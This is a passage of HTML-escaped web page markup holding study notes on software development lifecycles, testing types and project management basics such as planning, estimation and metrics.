    &lt;a href=&#34;#steering-committee&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Group of people responsible for making decisions and providing guidance on a specific project or initiative&lt;/li&gt;
&lt;li&gt;Project initiative is aligned with the organization&amp;rsquo;s goals and objectives&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;development-process&#34; &gt;Development Process
&lt;span&gt;
    &lt;a href=&#34;#development-process&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;System Development Lifecycle (SDLC) (structured set of activities)&lt;/li&gt;
&lt;li&gt;Goal: deliver high-quality system that meets or exceeds customer expectations and is completed on time and within budget&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;system-process-descriptions&#34; &gt;System Process Descriptions
&lt;span&gt;
    &lt;a href=&#34;#system-process-descriptions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Products: outcomes&lt;/li&gt;
&lt;li&gt;Roles: responsibilities of people involved&lt;/li&gt;
&lt;li&gt;Pre and post conditions: conditions before starting and after a process is done&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;traditional-waterfall-model&#34; &gt;Traditional Waterfall Model
&lt;span&gt;
    &lt;a href=&#34;#traditional-waterfall-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Separate and distinct phases of specification and development&lt;/li&gt;
&lt;li&gt;lack of flexibility
&lt;ul&gt;
&lt;li&gt;rigid sequences of phases&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;limited customer involvement
&lt;ul&gt;
&lt;li&gt;initial requirements gathering does not involve customer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;high risk of project failure
&lt;ul&gt;
&lt;li&gt;assumes all requirements can be defined at the beginning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lack of detection of defects
&lt;ul&gt;
&lt;li&gt;testing performed at later stages of the traditional model&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;limited visibility and feedback
&lt;ul&gt;
&lt;li&gt;limited visibility of progress until later stages&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;long development cycles
&lt;ul&gt;
&lt;li&gt;each phase needs to be completed before the next&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When to use&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;requirements unlikely to change&lt;/li&gt;
&lt;li&gt;stricter control and more predictable budget and timeframe (government)&lt;/li&gt;
&lt;li&gt;multiple rules and regulations must be followed when working on a project (healthcare projects)&lt;/li&gt;
&lt;li&gt;well-know tech stack&lt;/li&gt;
&lt;li&gt;mission-critical applications&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;incremental-development&#34; &gt;Incremental Development
&lt;span&gt;
    &lt;a href=&#34;#incremental-development&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Specification, development, and validation are interleaved&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Customer value delivered with each increment&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Rapid delivery&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Variable requirements are easy to accomodate&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Process not visible, regular deliverables required&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;System structure degrades with each increment unless refactored&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Useful for loosely coupled parts such as microservice or web services&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Unclear business needs&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;R&amp;amp;D or introduction of new product&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Quick and early working software&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Flexible&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Easier to test and debug during a smaller iteration&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Easier to control risk&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Not all requirements are gathered up front, leading to system architecture affecting problems&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Pressure on user engagement&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Feature creep: product requirements increase during development beyond expected initially&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;project-kickoff&#34; &gt;Project Kickoff
&lt;span&gt;
    &lt;a href=&#34;#project-kickoff&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Requirements
&lt;ul&gt;
&lt;li&gt;Gathering&lt;/li&gt;
&lt;li&gt;Analysis&lt;/li&gt;
&lt;li&gt;Specification (documenting)&lt;/li&gt;
&lt;li&gt;Evaluation (validation) → re-evaluate (analysis)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A requirement is a simple statement of what the system must do or what characteristics does it have. Requirements will describe&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;business requirements&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;user requirements&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;what does the user expect the system to be able to perform&lt;/li&gt;
&lt;li&gt;tasks integral to business&amp;rsquo; operations&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;functional requirements (what software should do)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;non-functional requirements or quality attributes (system characteristics)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;system--software-design&#34; &gt;System &amp;amp; Software Design
&lt;span&gt;
    &lt;a href=&#34;#system--software-design&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;System&amp;rsquo;s Architecture
&lt;ul&gt;
&lt;li&gt;high-level roadmap&lt;/li&gt;
&lt;li&gt;relationships between requirements and its components&lt;/li&gt;
&lt;li&gt;must be regularly updated&lt;/li&gt;
&lt;li&gt;specific design decisions and priorities can be made within this framework&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System Design
&lt;ul&gt;
&lt;li&gt;Identify design goals&lt;/li&gt;
&lt;li&gt;System decomposition&lt;/li&gt;
&lt;li&gt;Hardware/Software mapping&lt;/li&gt;
&lt;li&gt;Persistent Data Management&lt;/li&gt;
&lt;li&gt;Version Control&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System Decomposition
&lt;ul&gt;
&lt;li&gt;Top-down representation breaking down complex functions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;development-methodologies&#34; &gt;Development Methodologies
&lt;span&gt;
    &lt;a href=&#34;#development-methodologies&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Structured
&lt;ul&gt;
&lt;li&gt;system is a set of processes&lt;/li&gt;
&lt;li&gt;processes accept inputs and outputs&lt;/li&gt;
&lt;li&gt;processes interact with data stores&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Object-Oriented
&lt;ul&gt;
&lt;li&gt;Collection of interacting objects&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-testing-goals&#34; &gt;Software Testing Goals
&lt;span&gt;
    &lt;a href=&#34;#software-testing-goals&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Validation&lt;/li&gt;
&lt;li&gt;Demonstrate software meets requirements&lt;/li&gt;
&lt;li&gt;Defect discovery&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-testing-strategies&#34; &gt;Software Testing Strategies
&lt;span&gt;
    &lt;a href=&#34;#software-testing-strategies&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Glass-box or white box testing
&lt;ul&gt;
&lt;li&gt;Can see internal, try running all lines&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Black-box testing
&lt;ul&gt;
&lt;li&gt;Can&amp;rsquo;t see the internal structure&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gray-box testing
&lt;ul&gt;
&lt;li&gt;Tester has partial knowledge of internal workings&lt;/li&gt;
&lt;li&gt;Access to some internal details such as architecture, database structure or specific code segments&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;software-testing-types&#34; &gt;Software Testing Types
&lt;span&gt;
    &lt;a href=&#34;#software-testing-types&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Unit testing
&lt;ul&gt;
&lt;li&gt;testing individual components in isolation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Module testing
&lt;ul&gt;
&lt;li&gt;test module according to requirements&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Integration testing
&lt;ul&gt;
&lt;li&gt;combine modules and group testing&lt;/li&gt;
&lt;li&gt;expose faults between integrated components&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System testing
&lt;ul&gt;
&lt;li&gt;test entire thing as per requirements&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User acceptance testing
&lt;ul&gt;
&lt;li&gt;final testing for release done by customer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;why-do-systems-fail&#34; &gt;Why do Systems Fail
&lt;span&gt;
    &lt;a href=&#34;#why-do-systems-fail&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Missing or Wrong or impossible  requirements&lt;/li&gt;
&lt;li&gt;Fault design/code&lt;/li&gt;
&lt;li&gt;Improperly implemented design&lt;/li&gt;
&lt;li&gt;Want to fix errors sooner in process of (requirements, design, coding, development testing, acceptance testing, operation)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;development-management&#34; &gt;Development Management
&lt;span&gt;
    &lt;a href=&#34;#development-management&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;A project is an effort to reach a specific goal by completing a unique set of interconnected tasks and making good use of resources&lt;/p&gt;
&lt;p&gt;unique purpose, temporary, requires resources, involve uncertainty&lt;/p&gt;
&lt;p&gt;lifecycle&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;collection of logical stages or phases that maps the life of a project from its beginning to its end for a project&lt;/li&gt;
&lt;li&gt;tangible and verifiable products of work&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;project-lifecycle&#34; &gt;Project Lifecycle
&lt;span&gt;
    &lt;a href=&#34;#project-lifecycle&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Project initiation: define project charter (objective &amp;amp; scope)&lt;/li&gt;
&lt;li&gt;Planning
&lt;ul&gt;
&lt;li&gt;work breakdown structure&lt;/li&gt;
&lt;li&gt;time estimate for each task&lt;/li&gt;
&lt;li&gt;cost estimate for each task&lt;/li&gt;
&lt;li&gt;Graphically portray activities in network diagram&lt;/li&gt;
&lt;li&gt;Calculate schedule and budget&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Execute&lt;/li&gt;
&lt;li&gt;Close&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;project-planning&#34; &gt;Project Planning
&lt;span&gt;
    &lt;a href=&#34;#project-planning&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Time-consuming&lt;/li&gt;
&lt;li&gt;Revised regularly&lt;/li&gt;
&lt;li&gt;Various plans developed to support master project plan&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;common-types-of-plans-fyi&#34; &gt;Common Types of Plans (FYI)
&lt;span&gt;
    &lt;a href=&#34;#common-types-of-plans-fyi&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Quality plan&lt;/li&gt;
&lt;li&gt;Validation plan&lt;/li&gt;
&lt;li&gt;Configuration management plan&lt;/li&gt;
&lt;li&gt;Self development plan&lt;/li&gt;
&lt;li&gt;Risk management plan&lt;/li&gt;
&lt;li&gt;Communication plan&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;project-constraints&#34; &gt;Project Constraints
&lt;span&gt;
    &lt;a href=&#34;#project-constraints&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Schedule, budget, resources (triangle)&lt;/li&gt;
&lt;li&gt;Estimate: (optimistic + 4 * realistic + pessimistic) / 6
&lt;ul&gt;
&lt;li&gt;Top-down macro (analogy, or math)&lt;/li&gt;
&lt;li&gt;Bottom-up micro (guess cost of the work breakdown)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Critical path is the longest amount of time it will take to complete the project&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;monitoring-and-control&#34; &gt;Monitoring and Control
&lt;span&gt;
    &lt;a href=&#34;#monitoring-and-control&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;baseline plan&lt;/li&gt;
&lt;li&gt;monitor progress&lt;/li&gt;
&lt;li&gt;measure actual progress and compare it to planned progress&lt;/li&gt;
&lt;li&gt;take corrective action(s) if the project is behind schedule, overrunning the budget&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;metrics-classification&#34; &gt;Metrics Classification
&lt;span&gt;
    &lt;a href=&#34;#metrics-classification&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;product metrics
&lt;ul&gt;
&lt;li&gt;software product characteristics&lt;/li&gt;
&lt;li&gt;size and complexity o the system&lt;/li&gt;
&lt;li&gt;quality and reliability of the system&lt;/li&gt;
&lt;li&gt;lines of code, FP, meat time to failure, number of errors&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;process metrics
&lt;ul&gt;
&lt;li&gt;system development process characteristics&lt;/li&gt;
&lt;li&gt;processes, techniqes, tools (lead time, defect rate, productivity, compliance, cost variance)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cumulative-budgets-and-actual-cost&#34; &gt;Cumulative Budgets and Actual Cost
&lt;span&gt;
    &lt;a href=&#34;#cumulative-budgets-and-actual-cost&#34;&gt;
